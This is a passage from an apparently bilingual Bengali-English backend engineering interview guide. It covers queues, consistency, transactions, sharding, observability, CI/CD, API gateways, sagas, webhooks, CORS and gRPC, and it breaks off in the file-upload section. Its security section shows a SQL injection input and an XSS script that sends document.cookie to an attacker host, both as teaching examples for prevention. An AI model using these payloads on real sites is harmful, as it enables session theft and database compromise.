> Event-driven architecture decouples services by publishing domain events. It improves scalability and resilience but introduces eventual consistency, duplicate handling, ordering, and observability challenges.

## 23. Message Queues (Kafka vs RabbitMQ)

### Message Queue Core Idea

Producer message publish করে, consumer পরে process করে।

```text
Producer -> Queue/Broker -> Consumer
```

### RabbitMQ

RabbitMQ message broker। Routing, acknowledgement, queue semantics strong।

Good for:

- Task queues
- Background jobs
- Work distribution
- Complex routing

Features:

- Exchanges
- Queues
- Routing keys
- Acknowledgement
- Dead letter exchange

### Kafka

Kafka distributed event streaming platform।

Good for:

- High-throughput event streams
- Logs
- Analytics pipeline
- Event sourcing
- Stream processing

Concepts:

- Topic
- Partition
- Offset
- Consumer group
- Retention

### Main Difference

RabbitMQ message consume হলে queue থেকে remove হয়। Kafka message retention period পর্যন্ত log-এ থাকে, consumer offset track করে।

### Senior Insight

Kafka ordering only within partition guarantee করে। Global ordering চাইলে single partition দরকার, কিন্তু throughput কমে।

RabbitMQ task distribution-এর জন্য excellent। Kafka replayable event log-এর জন্য excellent।

### Common Mistakes

- Kafka শুধু queue replacement ভাবা।
- Partition key ভুল design করা।
- Consumer idempotency না রাখা।
- DLQ না রাখা।

### Interview Angle

> RabbitMQ is a traditional broker good for task queues and routing. Kafka is a distributed append-only log good for high-throughput streams and replayable events. Choice depends on workload: jobs vs event streams.

## 24. Async vs Sync Processing

### Sync Processing

Client request করে এবং কাজ শেষ না হওয়া পর্যন্ত wait করে।

Good for:

- Immediate result দরকার
- Simple workflows
- Strong consistency

### Async Processing

Request accept করে background job/queue-তে কাজ করা হয়।

Good for:

- Email sending
- Image processing
- Report generation
- Payment webhook
- Notification

### Example

```text
POST /reports -> 202 Accepted -> background job -> notify user
```

### Senior Insight

Async system-এ job status tracking দরকার:

- `pending`
- `processing`
- `completed`
- `failed`

Retry policy, DLQ, idempotency, and observability essential।

### Common Mistakes

- Long-running task sync request-এ করা।
- Queue job duplicate হতে পারে ধরে না নেওয়া।
- Job failure user-কে জানানো না।

### Interview Angle

> Sync is simple and immediate but blocks user. Async improves responsiveness and resilience for long-running work, but requires queue, retry, status tracking, idempotency, and failure handling.

## 25. WebSockets vs HTTP

### HTTP

Request-response model:

```text
Client -> Request
Server -> Response
```

Good for:

- CRUD APIs
- Web pages
- Stateless communication

### WebSocket

Persistent full-duplex connection:

```text
Client <-> Server
```

Good for:

- Chat
- Live notifications
- Multiplayer games
- Collaborative editing
- Live dashboards

### Other Options

- **Polling:** Client repeated request করে।
- **Long polling:** Server response delay করে until data available।
- **Server-Sent Events (SSE):** Server থেকে client একমুখী stream।

### Senior Insight

WebSocket scale করতে sticky connection, connection state, backpressure, heartbeat/ping-pong, reconnect logic দরকার।

Multiple servers হলে pub/sub layer লাগে:

```text
WebSocket servers <-> Redis Pub/Sub/Kafka/NATS
```

### Common Mistakes

- WebSocket দিয়ে সব API বানানো।
- Reconnect strategy না রাখা।
- Auth/token refresh problem ignore করা।
- Connection leak monitor না করা।

### Interview Angle

> HTTP is stateless request-response. WebSocket is persistent bi-directional communication for real-time use cases. Scaling WebSockets requires connection management, heartbeat, pub/sub, and backpressure handling.

## 26. API Versioning Strategies

### Why Versioning

API change করলে old clients break হতে পারে। Versioning backward compatibility manage করে।

### Strategies

#### URL Path

```text
/api/v1/users
/api/v2/users
```

Pros:

- Simple
- Visible

Cons:

- URL pollution

#### Header Versioning

```text
Accept: application/vnd.company.v2+json
```

Pros:

- Cleaner URL
- More REST-pure

Cons:

- Harder to test manually

#### Query Versioning

```text
/api/users?version=2
```

Simple but less common for serious public APIs।

### Senior Insight

Versioning strategy থেকেও বেশি important:

- Backward-compatible changes
- Deprecation policy
- Changelog
- Sunset header
- Client migration window

Breaking changes:

- Field remove/rename
- Type change
- Meaning change
- Required field add

Usually safe changes:

- New optional field
- New endpoint
- New enum only if clients handle unknown values

### Common Mistakes

- Every small change-এ new version।
- Old version deprecate plan না রাখা।
- Response shape silently change করা।

### Interview Angle

> API versioning prevents breaking existing clients. Path versioning is simplest, header versioning is cleaner. Senior engineers prefer backward-compatible evolution, clear deprecation policy, and migration support.

## 27. Retries, Backoff & Circuit Breakers

### Retry

Temporary failure হলে request আবার try করা।

Retry good for:

- Network timeout
- 502/503/504
- Temporary dependency failure

Retry bad for:

- Validation error
- Auth error
- Non-idempotent operation without idempotency key

### Backoff

Retry-এর মাঝে wait time বাড়ানো।

Example:

```text
100ms -> 200ms -> 400ms -> 800ms
```

Add jitter:

```text
random delay
```

Jitter prevents all clients retrying at same time।

### Circuit Breaker

Dependency repeatedly fail করলে circuit open হয় এবং কিছু সময় request পাঠানো বন্ধ থাকে।

States:

- Closed: normal
- Open: request blocked
- Half-open: limited trial request

### Senior Insight

Retries can make outage worse। যদি DB slow হয় এবং সব service retry storm করে, traffic multiply হয়ে system collapse করতে পারে।

Need:

- Retry budget
- Timeout
- Backoff with jitter
- Idempotency
- Circuit breaker

### Common Mistakes

- Infinite retry
- Retry without timeout
- POST retry without idempotency
- Multiple layers retry করে retry explosion।

### Interview Angle

> Retries handle transient failures, backoff avoids immediate retry pressure, and circuit breakers stop calling unhealthy dependencies. Senior implementation includes jitter, timeouts, retry budget, and idempotency.

## 28. Distributed Systems Basics

### Core Idea

Multiple machines/services একসাথে একটি system হিসেবে কাজ করলে distributed system।

### Challenges

- Network failure
- Latency
- Partial failure
- Clock skew
- Data replication
- Consistency
- Duplicate messages
- Ordering
- Observability

### Key Principle

Network unreliable। Failure partial হতে পারে:

```text
Service A alive
Service B alive
Network between them broken
```

### Senior Insight

Distributed system design-এ assume করতে হয়:

- Request timeout হতে পারে।
- Same message multiple times আসতে পারে।
- Response lost হতে পারে।
- Data temporarily inconsistent হতে পারে।
- Clock exact same হবে না।

Tools/patterns:

- Idempotency
- Retry with backoff
- Circuit breaker
- Saga
- Outbox pattern
- Leader election
- Quorum
- Distributed tracing

### Common Mistakes

- Local function call-এর মতো remote call ভাবা।
- Timeout না রাখা।
- Exactly-once delivery assume করা।
- Logs correlation ID ছাড়া রাখা।

### Interview Angle

> Distributed systems are hard because failures are partial and networks are unreliable. Senior engineers design for timeouts, retries, idempotency, eventual consistency, observability, and graceful degradation.

## 29. Consistency Models (Strong vs Eventual)

### Strong Consistency

Write complete হলে subsequent read latest value পাবে।

Good for:

- Banking
- Inventory reservation
- Account balance

### Eventual Consistency

Write-এর পরে সব replica eventually update পাবে, কিন্তু immediate read stale হতে পারে।

Good for:

- Likes count
- News feed
- Analytics
- Search indexing

### Other Models

- Read-your-writes
- Monotonic reads
- Causal consistency

### Senior Insight

Consistency should match user expectation। User profile update করলে user নিজে latest data দেখতে চাইবে। কিন্তু অন্য user ১-২ second পরে দেখলেও acceptable হতে পারে।

Search systems often eventual consistent। Product update করলে search result একটু পরে update হয়।

### Common Mistakes

- Eventual consistency user-facing critical flow-তে ব্যবহার করা।
- Stale read possibility UI/UX-এ handle না করা।
- Replica lag monitor না করা।

### Interview Angle

> Strong consistency guarantees latest reads after writes, but may cost latency/availability. Eventual consistency improves scalability/availability but allows temporary stale reads. Senior design maps consistency level to business correctness.

## 30. Database Transactions

### Core Idea

Transaction হলো একাধিক database operation-এর atomic unit।

Example:

```text
Transfer $100
1. Sender balance decrease
2. Receiver balance increase
```

দুটোই হবে, নাহলে কোনোটাই হবে না।

### SQL Example

```sql
BEGIN;
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;
COMMIT;
```

Error হলে:

```sql
ROLLBACK;
```

### Isolation Levels

- Read Uncommitted
- Read Committed
- Repeatable Read
- Serializable

### Common Problems

- Dirty read
- Non-repeatable read
- Phantom read
- Lost update
- Deadlock

### Senior Insight

Serializable safest but expensive। Most systems isolation level trade-off করে।

Concurrency control:

- Pessimistic locking: `SELECT FOR UPDATE`
- Optimistic locking: version column

### Common Mistakes

- Transaction too long রাখা।
- External API call transaction-এর ভিতরে করা।
- Deadlock retry না করা।
- Balance update read-modify-write race condition।

### Interview Angle

> Transactions ensure multiple DB operations succeed or fail together. Senior engineers understand isolation levels, locking, deadlocks, and avoid long transactions or external calls inside transactions.

## 31. Sharding & Partitioning

### Partitioning

একই database/table-এর data logical বা physical ভাগ করা।

Types:

- Range partition
- List partition
- Hash partition

Example:

```text
orders_2025
orders_2026
```

### Sharding

Data multiple database servers-এ ভাগ করা।

Example:

```text
User 1-100000 -> shard A
User 100001-200000 -> shard B
```

### Shard Key

Shard key decide করে data কোন shard-এ যাবে।

Good shard key:

- Even distribution
- Query pattern support করে
- Hotspot কম

### Senior Insight

Sharding adds huge operational complexity:

- Cross-shard query hard
- Cross-shard transaction hard
- Rebalancing hard
- Hot shard problem
- Global unique ID দরকার

Often before sharding:

- Index optimize
- Read replica
- Caching
- Partitioning
- Query optimization

### Common Mistakes

- Too early sharding।
- Bad shard key, যেমন country যেখানে এক country huge।
- Cross-shard join expectation।
- Re-sharding plan না রাখা।

### Interview Angle

> Partitioning splits data within a database; sharding splits data across database servers. Sharding scales writes/storage but adds complexity around queries, transactions, rebalancing, and shard key design.

## 32. Cold Start Problem

### Core Idea

Serverless function idle থাকার পর first request এলে runtime/container initialize হতে সময় লাগে। এটাকে cold start বলে।

### Causes

- Container startup
- Runtime initialization
- Dependency load
- DB connection setup
- VPC/network initialization

### Impact

- First request slow
- P99 latency bad
- User-facing API affected

### Mitigation

- Keep warm
- Provisioned concurrency
- Smaller package size
- Lazy load dependencies
- Reuse DB connection
- Avoid heavy startup work

### Senior Insight

Serverless great for spiky workloads, background tasks, and event-driven systems। কিন্তু latency-sensitive API-তে cold start budget বুঝতে হয়।

Language matters:

- Node/Python often faster startup
- Java/.NET cold start heavier হতে পারে, though modern improvements আছে

### Common Mistakes

- Serverless function-এ huge dependency bundle।
- Each invocation নতুন DB connection।
- Cold start only average latency দিয়ে hide করা।

### Interview Angle

> Cold start is initialization latency after a serverless function has been idle. It affects tail latency. Senior mitigation includes provisioned concurrency, smaller bundles, connection reuse, and moving heavy work out of startup.

## 33. Observability (Logs, Metrics, Tracing)

### Core Idea

Observability means system-এর internal state output দেখে বুঝতে পারা।

### Logs

Discrete events:

```text
User login failed
Payment gateway timeout
```

Good logs include:

- Timestamp
- Level
- Service name
- Request ID
- User/org ID, safe হলে
- Error stack

### Metrics

Numeric measurements over time:

- Request rate
- Error rate
- Latency
- CPU/memory
- Queue depth
- DB connections

Golden signals:

- Latency
- Traffic
- Errors
- Saturation

### Tracing

একটি request কোন কোন service/database/cache call করলো তা দেখায়।

```text
API Gateway -> User Service -> Redis -> PostgreSQL
```

### Senior Insight

Logs tell what happened। Metrics tell how often/how bad। Traces tell where time went।

Correlation ID mandatory for microservices:

```text
X-Correlation-ID
```

### Common Mistakes

- Sensitive data log করা।
- Structured logging না করা।
- Only logs, no metrics/traces।
- Error alert too noisy।

### Interview Angle

> Observability combines logs, metrics, and tracing. Logs explain events, metrics show system health trends, and traces show request flow across services. Senior systems use correlation IDs and alert on symptoms, not noise.

## 34. Monitoring vs Alerting

### Monitoring

System health observe করা:

- Dashboards
- Metrics
- Logs
- Traces

### Alerting

Problem হলে responsible person/team-কে notify করা।

Good alert:

- Actionable
- User-impacting
- Clear severity
- Low noise

### Example Alerts

Good:

```text
Checkout error rate > 5% for 5 minutes
```

Bad:

```text
CPU > 70%
```

CPU high always user impact না।

### Senior Insight

Alert fatigue বড় problem। Too many false alerts হলে engineers real incident miss করে।

SLO-based alerting better:

- Availability
- Latency
- Error budget

### Common Mistakes

- Every warning alert করা।
- No runbook।
- Alert owner clear না।
- Dependency issue and app issue আলাদা না করা।

### Interview Angle

> Monitoring is observing system behavior; alerting is notifying humans when action is needed. Senior alerting focuses on user impact, SLOs, severity, and actionable runbooks.

## 35. CI/CD Pipelines

### CI

Continuous Integration:

- Code push
- Build
- Test
- Lint
- Security scan

### CD

Continuous Delivery/Deployment:

- Artifact build
- Deploy staging
- Deploy production
- Rollback if needed

### Pipeline Stages

```text
Commit -> Build -> Test -> Package -> Deploy -> Verify
```

### Deployment Strategies

- Rolling deploy
- Blue-green deploy
- Canary deploy
- Feature flags

### Senior Insight

Good CI/CD includes:

- Fast feedback
- Reproducible builds
- Automated tests
- Secrets management
- DB migration strategy
- Rollback strategy
- Observability after deploy

DB migration must be backward-compatible:

1. Add new nullable column।
2. Deploy app writing both।
3. Backfill।
4. Switch reads।
5. Remove old column later।

### Common Mistakes

- Deploy and migration tightly coupled without rollback plan।
- Secrets in repo।
- No smoke test।
- Manual production deploy only।

### Interview Angle

> CI validates code continuously; CD safely ships it. Senior CI/CD includes tests, security checks, deployment strategies, backward-compatible migrations, rollback, and post-deploy monitoring.

## 36. Graceful Shutdown

### Core Idea

Server shutdown হলে running request শেষ করে, new request নেওয়া বন্ধ করে, resources clean করে exit করা।

### Flow

```text
SIGTERM received
Stop accepting new requests
Finish in-flight requests
Close DB/queue connections
Exit
```

### Why Important

- Request drop কমে
- Data corruption কমে
- Deployment safer
- Kubernetes rolling update smooth হয়

### Senior Insight

Kubernetes `terminationGracePeriodSeconds`, readiness probe, and load balancer deregistration timing align করতে হয়।

Worker process হলে:

- Current job finish করবে?
- Job requeue করবে?
- Lock release করবে?

### Common Mistakes

- SIGTERM handle না করা।
- Readiness false না করে shutdown করা।
- Long request graceful timeout ছাড়িয়ে যাওয়া।
- Queue job half-done রেখে exit।

### Interview Angle

> Graceful shutdown stops new work, completes in-flight work, closes resources, and exits cleanly. It is essential for rolling deployments and avoiding request loss.

## 37. Timeouts & Retries

### Timeout

Dependency response না দিলে কতক্ষণ wait করবেন।

Types:

- Connection timeout
- Read timeout
- Request timeout
- Idle timeout

### Why Timeout Matters

Timeout না থাকলে thread/connection hang হয়ে system resource exhaust করতে পারে।

### Retry

Transient failure হলে আবার try করা।

Important:

- Retry only safe errors
- Backoff + jitter
- Max attempts
- Idempotency

### Senior Insight

Timeout budget chain-wide ভাবতে হয়।

Example:

```text
Client timeout: 2s
API -> Service A -> DB
```

DB timeout 5s হলে API client already gone, resource waste।

### Common Mistakes

- Default timeout rely করা।
- Retry timeout-এর চেয়ে বেশি সময় চালানো।
- Every layer retry করা।
- Non-idempotent POST retry।

### Interview Angle

> Timeouts prevent resource exhaustion; retries handle transient failures. Senior design sets timeout budgets, uses backoff+jitter, limits attempts, and retries only idempotent operations.

## 38. Security Basics (XSS, CSRF, SQL Injection)

Security backend-এর add-on না, core responsibility।

### SQL Injection (SQLi)

#### What It Is

User input SQL query-এর অংশ হিসেবে execute হলে SQL injection হয়।

Bad:

```sql
SELECT * FROM users WHERE id = ' + userInput + ';
```

Attacker input:

```sql
1' OR '1'='1
```

#### Prevention

- Parameterized query
- Prepared statement
- ORM safe query API
- Input validation
- Least privilege DB user

Good:

```sql
SELECT * FROM users WHERE id = $1;
```

#### Senior Insight

Blind SQLi, time-based SQLi, and second-order SQLi আছে। শুধু obvious login bypass না।

### Cross-Site Scripting (XSS)

#### What It Is

Attacker malicious script user browser-এ run করায়।

Example:

```html
<script>
  fetch('https://attacker.com?c=' + document.cookie);
</script>
```

#### Types

- Stored XSS
- Reflected XSS
- DOM-based XSS

#### Prevention

- Output escaping
- HTML sanitization
- CSP header
- `HttpOnly` cookies
- Avoid unsafe innerHTML

#### Senior Insight

Input validation alone enough না। Context-aware output encoding দরকার। HTML, attribute, URL, JS context আলাদা।

### Cross-Site Request Forgery (CSRF)

#### What It Is

User logged-in থাকলে malicious site তার browser দিয়ে আপনার app-এ request পাঠায়।

#### Prevention

- CSRF token
- `SameSite` cookie
- Origin/Referer check
- Re-auth for sensitive actions

### Other Important Security Concepts

- Password hashing: bcrypt, scrypt, Argon2
- Rate limit login
- MFA for sensitive accounts
- Secrets management
- Dependency scanning
- HTTPS everywhere
- Security headers
- Principle of least privilege
- Audit logs

### Common Mistakes

- Password plain hash, যেমন SHA256, দিয়ে store করা।
- Error message-এ sensitive info।
- JWT secret weak রাখা।
- File upload validation না করা।
- Authorization check frontend-এ rely করা।

### Interview Angle

> SQLi is prevented with parameterized queries, XSS with output encoding/sanitization/CSP, and CSRF with tokens/SameSite/origin checks. Senior security also includes password hashing, rate limiting, least privilege, audit logs, and secure secrets management.

## 39. API Gateway Role

### Core Idea

API Gateway client এবং internal services-এর মধ্যে single entry point।

```text
Client -> API Gateway -> Internal Services
```

### Core Responsibilities

- Routing
- Authentication
- Authorization
- Rate limiting
- Request validation
- Protocol translation
- Response transformation
- Logging/metrics/tracing
- CORS handling

### Request Routing

```text
/users -> User Service
/orders -> Order Service
/payments -> Payment Service
```

### Authentication & Authorization

Gateway common auth validate করতে পারে:

- JWT
- API key
- OAuth token
- mTLS certificate

But service-level authorization still needed for sensitive business rules।

### Rate Limiting & Throttling

Gateway global rate limit enforce করতে পারে:

- Per IP
- Per user
- Per API key
- Per organization

### Protocol Translation

Client HTTP/JSON use করলেও internal service gRPC use করতে পারে।

```text
HTTP/JSON -> Gateway -> gRPC
```

### Request Aggregation (BFF Pattern)

Mobile homepage-এ ৩ service থেকে data লাগে:

```text
User + Orders + Recommendations
```

Client ৩টা request না করে gateway/BFF এক response দিতে পারে।

### Senior Insight

Gateway-কে overstuffed monolith বানানো যাবে না। Gateway cross-cutting concern handle করবে, কিন্তু business logic ideally service/BFF boundary-তে থাকবে।

High-scale gateway concerns:

- Backpressure
- Circuit breaking
- Retry policy
- Timeout budget
- WAF integration
- IP allow/block list
- Correlation ID
- Request body size limit
- Schema validation

### Real-World Request Flow

```text
Client
  -> DNS
  -> CDN/WAF
  -> Load Balancer
  -> API Gateway
  -> Service Discovery
  -> Microservice
  -> Cache/DB/Queue
```

### Common Mistakes

- Gateway-তে too much business logic।
- Gateway auth করলেই internal service trust করা।
- No timeout between gateway and service।
- Gateway single point of failure।
- Large payload limit না রাখা।

### Interview Angle

> API Gateway is the single entry point that handles routing and cross-cutting concerns like auth, rate limiting, logging, and protocol transformation. Senior design avoids putting too much business logic there and includes timeout, circuit breaker, backpressure, WAF, and observability.

## 40. Backend Interview Mental Model

### যখন কোনো Backend Concept Explain করবে

এই structure follow করো:

1. Definition দাও।
2. কেন দরকার বলো।
3. কীভাবে কাজ করে বলো।
4. Trade-off বলো।
5. Production issue বলো।
6. Senior-level mitigation বলো।

Example:

```text
Caching improves latency and reduces DB load, but stale data risk creates cache invalidation problem. In production I would use TTL, explicit invalidation, versioned keys, and stampede protection.
```

### Senior Engineers সাধারণত যেগুলো খেয়াল করে

- Failure mode
- Trade-off
- Observability
- Security
- Scalability
- Data correctness
- Operational simplicity
- Rollback plan
- Cost

### Common Interview Mistakes

- শুধু definition বলা।
- Trade-off না বলা।
- “Always” বা “Never” type answer।
- Production failure ভাবতে না পারা।
- Security and observability ignore করা।

### Strong Closing Line

Interview answer শেষ করতে পারো এভাবে:

> “So the choice depends on traffic pattern, consistency requirement, failure tolerance, and operational complexity.”

এই sentence senior-level thinking show করে, কারণ backend engineering-এ প্রায় সব decision trade-off based।

## 41. Microservices vs Monolith

### Core Idea

- **Monolith:** পুরো application এক codebase/deployment unit।
- **Microservices:** Application ছোট ছোট independent service-এ ভাগ করা।

### Monolith Good For

- Small/medium team
- Fast early development
- Simple deployment
- Easier debugging
- Strong transaction consistency

### Microservices Good For

- Large team
- Independent scaling
- Independent deployment
- Clear domain ownership
- Technology flexibility

### Senior Insight

Microservices architecture technical solution-এর আগে organizational solution। Team যদি service ownership, observability, DevOps maturity, CI/CD, and incident handling করতে না পারে, microservices complexity বাড়াবে।

Monolith bad না। অনেক successful company modular monolith দিয়ে শুরু করে, তারপর boundary clear হলে service split করে।

### Common Mistakes

- Early microservices।
- Shared database across microservices।
- Service boundary business domain অনুযায়ী না করা।
- Distributed transaction problem ignore করা।
- Observability ছাড়া microservices চালানো।

### Interview Angle

> Monolith is simpler and often best for early-stage systems. Microservices help independent scaling and team ownership but introduce distributed-system complexity. Senior engineers usually prefer modular monolith first, then split services when boundaries and scale justify it.

## 42. Service Discovery

### Core Idea

Dynamic infrastructure-এ service instance-এর IP/port বদলাতে পারে। Service discovery বলে কোন service কোথায় চলছে সেটা খুঁজে বের করার process।

### Why Needed

Microservice environment-এ instance add/remove হয়:

```text
order-service-1: 10.0.0.5
order-service-2: 10.0.0.9
order-service-3: removed
```

Client hardcoded IP use করলে break করবে।

### Types

#### Client-Side Discovery

Client registry থেকে healthy instance নিয়ে call করে।

```text
Client -> Service Registry -> Service
```

#### Server-Side Discovery

Client load balancer/gateway call করে, gateway registry দেখে service route করে।

```text
Client -> Load Balancer -> Service
```

### Tools

- Kubernetes Service/DNS
- Consul
- Eureka
- etcd
- ZooKeeper

### Senior Insight

Service discovery health check-এর উপর depend করে। Instance alive মানেই ready না। তাই readiness and liveness আলাদা বুঝতে হয়।

### Common Mistakes

- Static IP hardcode করা।
- Health check shallow রাখা।
- Dead instance registry থেকে remove না হওয়া।
- DNS TTL behavior না বোঝা।

### Interview Angle

> Service discovery lets services find healthy instances dynamically. It can be client-side or server-side. In Kubernetes, service discovery is commonly handled through Services and DNS.

## 43. Database Replication & Read Replicas

### Core Idea

Replication হলো primary database থেকে replica database-এ data copy করা।

```text
Primary DB -> Replica DB 1
Primary DB -> Replica DB 2
```

### Why Use Replicas

- Read scaling
- High availability
- Backup/reporting workload offload
- Disaster recovery

### Primary-Replica Model

- Writes go to primary।
- Reads can go to replica।

### Replication Lag

Replica primary থেকে কিছুটা পিছিয়ে থাকতে পারে।

Example:

```text
User profile update করলো।
Immediately replica থেকে read করলে পুরনো data দেখা যেতে পারে।
```

### Senior Insight

Read-after-write consistency important হলে same user-এর immediate read primary থেকে serve করতে হতে পারে। অথবা session-based routing/use primary for short time after write।

### Common Mistakes

- Replica always latest ভাবা।
- Critical read replica থেকে করা।
- Replication lag monitor না করা।
- Report query replica overload করে replication slow করা।

### Interview Angle

> Read replicas scale read traffic and improve availability, but introduce replication lag. Senior systems route writes to primary, read-heavy traffic to replicas, and handle read-after-write consistency carefully.

## 44. Database Locks & Concurrency Control

### Core Idea

একই data একসাথে multiple transaction update করলে race condition হতে পারে। Locking/concurrency control data correctness ensure করে।

### Race Condition Example

Stock আছে ১টি। দুই user একসাথে buy করলো।

```text
User A reads stock = 1
User B reads stock = 1
Both purchase success
Stock becomes invalid
```

### Pessimistic Locking

Data আগে lock করা হয়।

```sql
SELECT * FROM products WHERE id = 1 FOR UPDATE;
```

Good for:

- High contention
- Critical correctness

### Optimistic Locking

Version column দিয়ে update করা হয়।

```sql
UPDATE products
SET stock = stock - 1, version = version + 1
WHERE id = 1 AND version = 7;
```

Affected row 0 হলে বুঝতে হবে অন্য কেউ update করেছে।

### Senior Insight

Locking correctness দেয়, কিন্তু performance cost আছে। Long transaction lock ধরে রাখলে deadlock, timeout, and poor throughput হতে পারে।

### Common Mistakes

- Read-modify-write without transaction।
- Lock নিয়ে external API call করা।
- Deadlock retry না করা।
- Optimistic lock conflict handle না করা।

### Interview Angle

> Concurrency control prevents race conditions. Pessimistic locking locks rows before update; optimistic locking uses version checks. Senior engineers choose based on contention, correctness need, and performance trade-off.

## 45. Saga Pattern

### Core Idea

Microservices-এ distributed transaction কঠিন। Saga pattern long business transaction-কে ছোট local transaction এবং compensating action-এ ভাগ করে।

### Example

Order placement:

```text
1. Create order
2. Reserve inventory
3. Charge payment
4. Send confirmation
```

Payment fail হলে:

```text
Cancel order
Release inventory
```

### Types

#### Choreography

Service event publish করে, অন্য service react করে।

```text
OrderCreated -> InventoryReserved -> PaymentCharged
```

#### Orchestration

একটি orchestrator পুরো flow control করে।

```text
Order Orchestrator -> Inventory -> Payment -> Email
```

### Senior Insight

Saga eventual consistency দেয়। User experience design করতে হয়, যেমন order status `pending`, `confirmed`, `failed`।

### Common Mistakes

- Compensation action না রাখা।
- Event duplicate handle না করা।
- Partial failure state track না করা।
- Business process observable না করা।

### Interview Angle

> Saga pattern manages distributed business workflows without distributed transactions. It uses local transactions and compensating actions. Choreography is event-driven; orchestration uses a central coordinator.

## 46. Outbox Pattern

### Core Idea

Database update এবং event publish একসাথে reliably করা hard। Outbox pattern একই DB transaction-এ business data এবং event record save করে।

### Problem

```text
Order saved in DB
Event publish failed
```

অন্য service জানলই না order create হয়েছে।

### Solution

Same transaction:

```text
1. Save order
2. Save OrderCreated event in outbox table
```

Then background worker outbox event publish করে।

### Flow

```text
App Transaction -> Business Table + Outbox Table
Worker -> Read Outbox -> Publish Event -> Mark Sent
```

### Senior Insight

Outbox pattern event-driven architecture-এ data consistency improve করে। Often CDC tools, যেমন Debezium, outbox table থেকে event stream করতে ব্যবহার হয়।

### Common Mistakes

- DB commit-এর পরে direct event publish করে consistency gap রাখা।
- Outbox worker idempotent না করা।
- Event sent mark করার race condition।
- Outbox table cleanup না করা।

### Interview Angle

> Outbox pattern ensures database changes and event publishing are reliable by storing events in the same transaction as business data, then asynchronously publishing them.

## 47. Webhooks

### Core Idea

Webhook হলো reverse API call। আপনার system অন্য system-কে event notify করে HTTP request পাঠায়।

Example:

```text
Payment provider -> POST /webhooks/payment
```

### Use Cases

- Payment success/failure
- GitHub push event
- Stripe subscription update
- Delivery status update

### Webhook Receiver Must Handle

- Signature verification
- Idempotency
- Retry
- Out-of-order delivery
- Fast acknowledgement
- Async processing

### Senior Insight

Webhook endpoint-এ heavy work করা উচিত না। Request verify করে quickly `200 OK` দিয়ে event queue-তে process করা ভালো।

Webhook delivery at-least-once হতে পারে, তাই duplicate event আসবেই ধরে design করতে হয়।

### Common Mistakes

- Signature verify না করা।
- Duplicate webhook process করা।
- Event order assume করা।
- Webhook secret rotate না করা।
- Long processing করে provider timeout করানো।

### Interview Angle

> Webhooks let external systems notify our backend about events. Senior implementation verifies signatures, stores event IDs for idempotency, processes asynchronously, and handles retries and out-of-order events.

## 48. CORS (Cross-Origin Resource Sharing)

### Core Idea

CORS browser security mechanism। এক origin-এর frontend অন্য origin-এর API call করতে পারবে কি না server CORS header দিয়ে বলে।

Origin মানে:

```text
scheme + host + port
```

Example:

```text
https://app.example.com
https://api.example.com
```

দুইটা different origin।

### Important Headers

```text
Access-Control-Allow-Origin
Access-Control-Allow-Methods
Access-Control-Allow-Headers
Access-Control-Allow-Credentials
```

### Preflight Request

Browser actual request-এর আগে `OPTIONS` request পাঠাতে পারে।

```text
OPTIONS /api/orders
```

### Senior Insight

CORS backend security authorization না। CORS শুধু browser-based restriction। Server-to-server request CORS মানে না। তাই auth/authorization অবশ্যই backend-এ লাগবে।

Credentials cookie পাঠাতে হলে:

- `Access-Control-Allow-Credentials: true`
- `Access-Control-Allow-Origin` specific origin হতে হবে, `*` না।

### Common Mistakes

- CORS error মানেই backend down ভাবা।
- `*` allow করে credentials expect করা।
- CORS-কে security boundary ভাবা।
- Preflight `OPTIONS` handle না করা।

### Interview Angle

> CORS controls whether browsers allow cross-origin frontend requests to an API. It is enforced by browsers, not servers. It does not replace authentication or authorization.

## 49. gRPC vs REST

### gRPC Core Idea

gRPC হলো high-performance RPC framework, সাধারণত HTTP/2 এবং Protocol Buffers ব্যবহার করে।

### REST

Resource-oriented:

```text
GET /users/1
```

### gRPC

Function/service-oriented:

```text
UserService.GetUser(id)
```

### gRPC Benefits

- Fast binary protocol
- Strong contract with `.proto`
- Streaming support
- Good for service-to-service communication
- Code generation

### gRPC Challenges

- Browser support direct simple না।
- Debugging REST-এর চেয়ে harder।
- Human-readable না।
- Public API consumers-এর জন্য learning curve।

### Senior Insight

Internal microservice communication-এ gRPC excellent। Public APIs-এর জন্য REST অনেক সময় easier। অনেক company external REST and internal gRPC use করে।

### Common Mistakes

- Public simple CRUD API-তে unnecessary gRPC।
- Proto backward compatibility না মানা।
- Deadline/timeout না সেট করা।
- Error mapping unclear রাখা।

### Interview Angle

> REST is resource-oriented and simple for public APIs. gRPC is contract-first, binary, fast, and strong for internal service-to-service communication, especially when streaming or strict schemas are needed.

## 50. OpenAPI / Swagger

### Core Idea

OpenAPI হলো REST API contract/documentation standard। Swagger tools দিয়ে API docs, client SDK, and testing support পাওয়া যায়।

### What It Defines

- Endpoints
- Methods
- Request body
- Response schema
- Status codes
- Auth method
- Error format

### Benefits

- Frontend/backend contract clear
- Auto-generated docs
- Client SDK generation
- Mock server
- Contract testing

### Senior Insight

OpenAPI শুধু docs না, API governance tool। CI pipeline-এ breaking change detect করা যায়।

Good API spec includes:

- Error response schema
- Pagination format
- Rate limit response
- Auth requirements
- Examples

### Common Mistakes

- Docs outdated রাখা।
- Actual API and OpenAPI spec mismatch।
- Error schema define না করা।
- Optional/required fields ভুল রাখা।

### Interview Angle

> OpenAPI documents and standardizes REST APIs. Senior teams use it as a contract for docs, SDK generation, mock servers, and breaking-change detection.

## 51. Background Jobs & Workers

### Core Idea

যে কাজ request-response cycle-এ করা দরকার নেই বা long-running, সেটা background worker দিয়ে করা হয়।

### Use Cases

- Email send
- Image/video processing
- Report generation
- Data import/export
- Retry failed payment
- Notification

### Flow

```text
API -> Queue -> Worker -> Result/Notification
```

### Worker Concerns

- Retry
- Idempotency
- Dead letter queue
- Job timeout
- Job priority
- Visibility timeout
- Monitoring

### Senior Insight

Background job at-least-once run হতে পারে। তাই job idempotent হতে হবে।

Example:

Email job duplicate run হলে same email বারবার না পাঠানোর জন্য email log/dedup key দরকার।

### Common Mistakes

- Job failure silently ignore করা।
- Infinite retry।
- No DLQ।
- Job status track না করা।
- Huge job single task হিসেবে রাখা, chunk না করা।

### Interview Angle

> Background jobs move slow or retryable work out of user requests. Senior worker design includes idempotency, retries with backoff, DLQ, job timeout, monitoring, and status tracking.

## 52. File Uploads & Object Storage

### Core Idea

File upload backend-এ directly store না করে সাধারণত object storage-এ রাখা হয়।

Examples:

- AWS S3
- Google Cloud Storage
- Azure Blob Storage

### Common Flow

Backend signed upload URL generate করে:

```text
Client -> API: request upload URL
API -> Object Storage: signed URL
